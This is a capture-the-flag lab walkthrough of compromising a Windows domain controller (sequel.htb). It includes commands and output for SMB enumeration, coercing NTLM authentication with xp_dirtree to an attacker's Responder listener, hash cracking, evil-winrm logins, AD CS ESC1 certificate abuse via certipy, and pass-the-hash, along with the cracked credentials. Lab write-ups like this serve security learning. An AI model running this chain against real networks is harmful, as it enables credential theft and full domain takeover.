
# Scope
10.129.15.60
# Information Gathering

## ports
what are the open ports on the machine?
`sudo nmap -Pn -sS -T5 -p- 10.129.15.60 -oN port-scan.txt`
`nmap -Pn -sU -T5 10.129.15.60`

tcp ports:
```
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1433/tcp  open  ms-sql-s
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49701/tcp open  unknown
49711/tcp open  unknown
52326/tcp open  unknown
```
udp ports:
```
PORT    STATE SERVICE
53/udp  open  domain
88/udp  open  kerberos-sec
123/udp open  ntp
389/udp open  ldap
```

first considerations:
This is a windows machine. Not only that but, since it has port 88 open we can tell it is a Domain Controller. 
## dns

nothing useful

# Enumeration

## port services:

Let's use nmap to further enumerate the services on the open ports:
`sudo nmap -sS -sV -sC -p $(paste -sd, tcp-ports.txt) -T5 -v 10.129.15.60 -oN tcp-port-scan.txt`

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        (generic dns response: SERVFAIL)
| fingerprint-strings:
|   DNS-SD-TCP:
|     _services
|     _dns-sd
|     _udp
|_    local
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-26 05:13:12Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Issuer: commonName=sequel-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-01-18T23:03:57
| Not valid after:  2074-01-05T23:03:57
| MD5:     ee4c c647 ebb2 c23e f472 1d70 2880 9d82
| SHA-1:   d88d 12ae 8a50 fcf1 2242 909e 3dd7 5cff 92d1 a480
|_SHA-256: 9b16 318b 7bc0 f508 b5cd 98a5 3a80 d1d7 54e1 e158 45b1 4956 003b 4bb5 05f8 7f98
|_ssl-date: 2026-03-26T05:14:42+00:00; +8h00m01s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-03-26T05:14:43+00:00; +8h00m01s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Issuer: commonName=sequel-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-01-18T23:03:57
| Not valid after:  2074-01-05T23:03:57
| MD5:     ee4c c647 ebb2 c23e f472 1d70 2880 9d82
| SHA-1:   d88d 12ae 8a50 fcf1 2242 909e 3dd7 5cff 92d1 a480
|_SHA-256: 9b16 318b 7bc0 f508 b5cd 98a5 3a80 d1d7 54e1 e158 45b1 4956 003b 4bb5 05f8 7f98
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info:
|   10.129.15.60:1433:
|     Target_Name: sequel
|     NetBIOS_Domain_Name: sequel
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: dc.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
| ms-sql-info:
|   10.129.15.60:1433:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-03-26T04:00:29
| Not valid after:  2056-03-26T04:00:29
| MD5:     fa28 4344 c48b 58a0 af59 c90f 5303 d902
| SHA-1:   84d6 3bc5 1db5 8f55 02fc 0bcf 7cdc 6ef9 13f2 f3b9
|_SHA-256: a7a8 b855 9300 cf27 7a26 59ef 648f 5a37 1611 0a83 cccf 117d f634 19fa bb97 52c8
|_ssl-date: 2026-03-26T05:14:42+00:00; +8h00m01s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Issuer: commonName=sequel-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-01-18T23:03:57
| Not valid after:  2074-01-05T23:03:57
| MD5:     ee4c c647 ebb2 c23e f472 1d70 2880 9d82
| SHA-1:   d88d 12ae 8a50 fcf1 2242 909e 3dd7 5cff 92d1 a480
|_SHA-256: 9b16 318b 7bc0 f508 b5cd 98a5 3a80 d1d7 54e1 e158 45b1 4956 003b 4bb5 05f8 7f98
|_ssl-date: 2026-03-26T05:14:42+00:00; +8h00m01s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Issuer: commonName=sequel-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-01-18T23:03:57
| Not valid after:  2074-01-05T23:03:57
| MD5:     ee4c c647 ebb2 c23e f472 1d70 2880 9d82
| SHA-1:   d88d 12ae 8a50 fcf1 2242 909e 3dd7 5cff 92d1 a480
|_SHA-256: 9b16 318b 7bc0 f508 b5cd 98a5 3a80 d1d7 54e1 e158 45b1 4956 003b 4bb5 05f8 7f98
|_ssl-date: 2026-03-26T05:14:43+00:00; +8h00m01s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49701/tcp open  msrpc         Microsoft Windows RPC
49711/tcp open  msrpc         Microsoft Windows RPC
52326/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.98%I=7%D=3/25%Time=69C44FF6%P=x86_64-pc-linux-gnu%r(DNS-
SF:SD-TCP,30,"\0\.\0\0\x80\x82\0\x01\0\0\0\0\0\0\t_services\x07_dns-sd\x04
SF:_udp\x05local\0\0\x0c\0\x01");
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 8h00m00s, deviation: 0s, median: 8h00m00s
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-03-26T05:14:02
|_  start_date: N/A
```

`sudo nmap -sU -sV -sC -p $(paste -sd, udp-ports.txt) -T5 -v 10.129.15.60 -oN udp-port-scan.txt`

```
PORT    STATE SERVICE      VERSION
53/udp  open  domain       Simple DNS Plus
88/udp  open  kerberos-sec Microsoft Windows Kerberos (server time: 2026-03-26 05:12:28Z)
123/udp open  ntp          NTP v3
| ntp-info:
|_  receive time stamp: 2026-03-26T05:12:40
389/udp open  ldap         Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
Too many fingerprints match this host to give specific OS details
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 8h00m10s
```

## smb:

`smbclient -N -L \\\\10.129.15.60\\`
```
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share
	Public          Disk
	SYSVOL          Disk      Logon server share
```

Let's check which shares we can access:

**Public**
```
smbclient \\\\10.129.15.60\\Public
Password for [WORKGROUP\philip]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Nov 19 06:51:25 2022
  ..                                  D        0  Sat Nov 19 06:51:25 2022
  SQL Server Procedures.pdf           A    49551  Fri Nov 18 08:39:43 2022
```

`smb: \> get "SQL Server Procedures.pdf"`

Let's take a quick look at the pdf meta data before proceeding:
`exiftool 'SQL Server Procedures.pdf'`

```
ExifTool Version Number         : 13.50
File Name                       : SQL Server Procedures.pdf
Directory                       : .
File Size                       : 50 kB
File Modification Date/Time     : 2026:03:25 17:21:11-04:00
File Access Date/Time           : 2026:03:25 17:21:59-04:00
File Inode Change Date/Time     : 2026:03:25 17:28:32-04:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Page Count                      : 2
Creator                         : Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) obsidian/0.15.6 Chrome/100.0.4896.160 Electron/18.3.5 Safari/537.36
Producer                        : Skia/PDF m100
Create Date                     : 2022:11:18 13:39:43+00:00
Modify Date                     : 2022:11:18 13:39:43+00:00
```

nothing useful.

Now let's examine the pdf file:
![[pdf-file-view.png]]

We have a goldmine of information:
- creds for new hires to access the DB: `PublicUser:GuestUserCantWrite1`
- users named: Ryan, Brandon, Tom
- Brandon's email: brandon.brown@sequel.htb
- There is an 'instance' on the DC
- The DC was cloned to a dedicated server
- Explains how to access the DB
## mssql:

attempting to 
`impacket-mssqlclient PublicUser@10.129.15.130 -target-ip 10.129.15.130 -dc-ip 10.129.15.130`

```
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL (PublicUser  guest@master)>
```

Let's enumerate DBs:

```
SELECT @@version;
SELECT SYSTEM_USER;
SELECT USER_NAME();
```

`Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)`

`PublicUser`

`guest`

List all DBs
`SELECT name FROM sys.databases;`

```
master (Can Access) (nothing interested)
tempdb (Can Access) (no tables)
model (Access Denied)
msdb (Can Access)
```

List tables in DB:
`SELECT table_name FROM information_schema.tables;`

List DB users:
`SELECT name FROM sys.database_principals;`

```
public
dbo
guest
INFORMATION_SCHEMA
sys
db_owner
db_accessadmin
db_securityadmin
db_ddladmin
db_backupoperator
db_datareader
db_datawriter
db_denydatareader
db_denydatawriter
```

is xp_cmdshell enabled?
`EXEC sp_configure 'xp_cmdshell';`

```
SQL (PublicUser  guest@msdb)> EXEC sp_configure 'xp_cmdshell';
ERROR(DC\SQLMOCK): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
SQL (PublicUser  guest@msdb)> EXEC sp_configure 'show advanced options',1;
ERROR(DC\SQLMOCK): Line 105: User does not have permission to perform this action.
```

**Using NetExec Modules:**

Found the mock DB:
`netexec mssql 10.129.15.130 -u PublicUser -p GuestUserCantWrite1 -M enum_links --local-auth`

```
MSSQL       10.129.15.130   1433   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb) (EncryptionReq:False)
MSSQL       10.129.15.130   1433   DC               [+] DC\PublicUser:GuestUserCantWrite1
ENUM_LINKS  10.129.15.130   1433   DC               [+] Linked servers found:
ENUM_LINKS  10.129.15.130   1433   DC               [*]   - DC\SQLMOCK
```

`netexec mssql 10.129.15.130 -u PublicUser -p GuestUserCantWrite1 -M enum_logins --local-auth`

```
MSSQL       10.129.15.130   1433   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb) (EncryptionReq:False)
MSSQL       10.129.15.130   1433   DC               [+] DC\PublicUser:GuestUserCantWrite1
ENUM_LOGINS 10.129.15.130   1433   DC               [*] Enumerated logins
ENUM_LOGINS 10.129.15.130   1433   DC               Login Name                          Type            Status
ENUM_LOGINS 10.129.15.130   1433   DC               ----------                          ----            ------
ENUM_LOGINS 10.129.15.130   1433   DC               PublicUser                          SQL User        ENABLED
ENUM_LOGINS 10.129.15.130   1433   DC               sa                                  SQL User        ENABLED
```

Let's try to connect to the `DC\SQLMOCK` DB:

`EXEC ('SELECT @@servername') AT [DC\SQLMOCK];`
```
EXEC ('SELECT @@version') AT [DC\SQLMOCK];
ERROR(DC\SQLMOCK): Line 1: Could not connect to server 'DC\SQLMOCK' because 'PublicUser' is not defined as a remote login at the server. Verify that you have specified the correct login name. .
```

For now we cant access the mock db. So let's try to capture hashes from the `sql_svc` user.

With MSSQL, you usually **coerce authentication** from the SQL Server service account (e.g., `sql_svc`) to capture its NetNTLM hash.

This depends on what you’re allowed to execute, but there are still some good paths to try.

On your machine setup a listener:
```
sudo responder -I tun0
```

In MSSQL try to force an authentication via `xp_dirtree`
```
EXEC master..xp_dirtree '\\YOUR_IP\share';
```

```
EXEC master..xp_dirtree '\\10.10.14.243\share';
```
> in my case.

We were able to capture the hash!
```
sql_svc::sequel:c97aeaf96957aef6:B0C132416E5B6B20EDF54CDF299B1DFA:010100000000000080AE81E109BDDC01DDF0F1DA534B9B0D000000000200080058004D003700460001001E00570049004E002D0035004D0048003800380046005200370032004B004A0004003400570049004E002D0035004D0048003800380046005200370032004B004A002E0058004D00370046002E004C004F00430041004C000300140058004D00370046002E004C004F00430041004C000500140058004D00370046002E004C004F00430041004C000700080080AE81E109BDDC0106000400020000000800300030000000000000000000000000300000ED8612E29FAD121EE0BE32F200C3065179BF61DC81AF3B2E04E0C424FC8F96DC0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003200340033000000000000000000
```

Let's try and crack it:

`cat sql-svc-hash.txt | hashid -m`

```
Analyzing 'SQL_SVC::sequel:c97aeaf96957aef6:b0c132416e5b6b20edf54cdf299b1dfa:010100000000000080ae81e109bddc01ddf0f1da534b9b0d000000000200080058004d003700460001001e00570049004e002d0035004d0048003800380046005200370032004b004a0004003400570049004e002d0035004d0048003800380046005200370032004b004a002e0058004d00370046002e004c004f00430041004c000300140058004d00370046002e004c004f00430041004c000500140058004d00370046002e004c004f00430041004c000700080080ae81e109bddc0106000400020000000800300030000000000000000000000000300000ed8612e29fad121ee0be32f200c3065179bf61dc81af3b2e04e0c424fc8f96dc0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003200340033000000000000000000'
[+] NetNTLMv2 [Hashcat Mode: 5600]
```

`hashcat -m 5600 sql-svc-hash.txt /usr/share/wordlists/rockyou.txt`

```
SQL_SVC::sequel:c97aeaf96957aef6:b0c132416e5b6b20edf54cdf299b1dfa:010100000000000080ae81e109bddc01ddf0f1da534b9b0d000000000200080058004d003700460001001e00570049004e002d0035004d0048003800380046005200370032004b004a0004003400570049004e002d0035004d0048003800380046005200370032004b004a002e0058004d00370046002e004c004f00430041004c000300140058004d00370046002e004c004f00430041004c000500140058004d00370046002e004c004f00430041004c000700080080ae81e109bddc0106000400020000000800300030000000000000000000000000300000ed8612e29fad121ee0be32f200c3065179bf61dc81af3b2e04e0c424fc8f96dc0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003200340033000000000000000000:REGGIE1234ronnie
```

# Exploitation

Let's try to use evil-winrm to access the server with `sql_svc:REGGIE1234ronnie`

`evil-winrm -i 10.129.15.60 -u sql_svc -p 'REGGIE1234ronnie'`

ACCESS GRANTED!

after investigating we find an interesting backup for error logs in `C:\SQLServer\Logs\ERRORLOG.BAK`

we can download it and view it:

looking through the file we found something interesting
```
2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2
```

we can make an educated guess that the creds are `Ryan.Cooper:NuclearMosquito3`

Let's try to pivot to the ryan user
`evil-winrm -i 10.129.15.60 -u Ryan.Cooper -p 'NuclearMosquito3'`

Awesome! we found the flag!
# Post Exploitation

Let's further enumerate and information gather:

Using winPEASx64.exe I found:

**Autorun Applications:**
```
=================================================================================
    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Run
    Key: VMware User Process
    Folder: C:\Program Files\VMware\VMware Tools
    File: C:\Program Files\VMware\VMware Tools\vmtoolsd.exe -n vmusr (Unquoted and Space detected) - C:\
=================================================================================
    RegPath: HKLM\Software\Classes\htmlfile\shell\open\command
    Folder: C:\Program Files\Internet Explorer
    File: C:\Program Files\Internet Explorer\iexplore.exe %1 (Unquoted and Space detected) - C:\
=================================================================================
```

```
=================================================================================
    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
    File: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini
    Potentially sensitive file content: LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-21787 =================================================================================
    Folder: C:\Users\Ryan.Cooper\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
    FolderPerms: Ryan.Cooper [Allow: AllAccess]
    File: C:\Users\Ryan.Cooper\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini (Unquoted and Space detected) - C:\Users\Ryan.Cooper\AppData\Roaming\Microsoft\Windows
    FilePerms: Ryan.Cooper [Allow: AllAccess]
    Potentially sensitive file content: LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-21787
=================================================================================
    Folder: C:\windows\tasks
    FolderPerms: Authenticated Users [Allow: WriteData/CreateFiles]   =================================================================================
    Folder: C:\windows\system32\tasks
    FolderPerms: Authenticated Users [Allow: WriteData/CreateFiles]
=================================================================================
```

After reviewing the winpeas output and doing some manual testing I haven't found any conventional Priv-Esc vulns so lets pivot to AD vulnerabilities.

Let's try to find more modern vulns like Bad Successor or AD CS vulns:

```
certipy-ad find -target-ip 10.129.15.60 -enabled -vulnerable -u Ryan.Cooper -p NuclearMosquito3
```

```
...
[!] Vulnerabilities
      ESC1 : Enrollee supplies subject and template allows client authentication.
```

```
certipy-ad req -u "ryan.cooper@sequel.htb" -p "NuclearMosquito3" -dc-ip "10.129.15.60" -target "10.129.15.60" -ca 'sequel-DC-CA' -template 'UserAuthentication' -upn 'administrator@sequel.htb'
```

Check if the certificate is really for admin
```
openssl pkcs12 -in administrator.pfx -clcerts -nokeys -out administrator.pem
```

```
openssl x509 -in administrator.pem -text -noout
```

Now use the certificate to gain access

```
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.15.60
```

I got this error:
```
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.15.60 -print
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator@SEQUEL.HTB'
[*] Using principal: 'administrator@sequel.htb'
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
[-] Use -debug to print a stacktrace
[-] See the wiki for more information
```

My clock is askew from the DC we can use the tool `ntpdate` to sync them very easily:
`sudo timedatectl set-ntp off`
`sudo ntpdate 10.129.15.60`

Now let's try again:
```
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.228.253 -print
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator@SEQUEL.HTB'
[*] Using principal: 'administrator@sequel.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Ticket:
doIGbzCCBmugAwIBBaEDAgEWooIFdjCCBXJhggVu...
```

Success! We can crack it or pass the hash

`evil-winrm -i 10.129.228.253 -u Administrator -H 'a52f78e4c751e5f5e17e1e9f3e58f4ee'`

